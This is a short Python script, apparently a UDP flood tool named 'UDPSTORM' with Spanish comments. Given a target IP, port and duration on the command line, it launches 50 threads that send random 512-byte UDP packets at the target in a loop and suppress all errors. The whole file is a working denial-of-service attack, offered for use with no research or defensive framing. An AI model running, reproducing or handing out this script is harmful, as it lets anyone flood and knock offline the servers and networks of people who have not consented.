#!/usr/bin/env python3
import socket
import random
import time
import threading
import sys

def attack_thread(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            data = random._urandom(512)
            sock.sendto(data, (target_ip, target_port))
        except:
            pass
    sock.close()

def udpstorm_attack(target_ip, target_port, duration):
    print(f"[UDPSTORM] Atacando {target_ip}:{target_port} por {duration}s con 50 hilos")
    
    threads = []
    for _ in range(50):  # 50 hilos
        t = threading.Thread(target=attack_thread, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Esperar que terminen todos
    for t in threads:
        t.join()

if __name__ == "__main__":
    if len(sys.argv) == 4:
        udpstorm_attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
